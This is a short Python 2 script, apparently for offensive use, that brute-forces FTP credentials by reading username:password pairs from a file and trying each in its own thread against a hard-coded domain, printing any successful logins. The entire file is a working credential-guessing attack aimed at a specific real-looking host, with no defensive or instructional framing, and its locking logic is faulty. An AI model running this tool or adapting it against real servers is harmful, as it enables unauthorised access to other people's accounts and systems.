#!/usr/bin/env python
import ftplib
from threading import *

screenLock = Semaphore(value=1)

def forceThread(hostname, userName, passWord):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login(userName, passWord)
		screenLock.release()
		print '\n[*] ' +str(hostname)+ ' FTP Logon Succeeded: '+userName+'/'+passWord
	except Exception, e:
		screenLock.acquire()
		print '[-]'+str(hostname)+' falha '+userName+'/'+passWord
	finally:
		screenLock.release()
		ftp.quit()

	

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF.readlines():
			userName = line.split(':')[0]
			passWord = line.split(':')[1].strip('\r').strip('\n')
			print '[+] Trying : '+userName+'/'+passWord
			
			t = Thread(target=forceThread, args=(hostname, userName, passWord))
			t.start()

		

def main():
	host = 'grupo2better.com.br'
	passwdFile = 'ftp.txt'

	bruteLogin(host, passwdFile)

if __name__ == '__main__':
	main()